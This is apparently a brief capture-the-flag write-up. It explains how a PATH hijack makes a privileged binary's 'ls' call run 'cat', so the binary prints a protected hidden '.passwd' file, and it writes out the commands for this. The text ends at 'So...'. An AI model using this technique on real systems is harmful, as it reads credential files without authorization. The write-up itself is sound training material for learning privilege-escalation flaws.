By listing the initial directory, can view two interesting files:
A C file and a compiled binary. 

By cating the C file, can see that it does an 'ls' to the hidden file '.passwd'
You are not the owner of these files, so you can't do a cat because you do not have permissions. 

So, let's check where have write permissions:

ls -la /

The C file does an 'ls' on the '.passwd' file. So we can replace de 'ls' command.

mkdir /tmp/hehehe/

cp /bin/cat /tmp/hehehe/ls

Let's to add this directory to the beginning of the PATH

export PATH=/tmp/hehehe:$PATH

Now when doing 'ls' actually does 'cat' 

So...
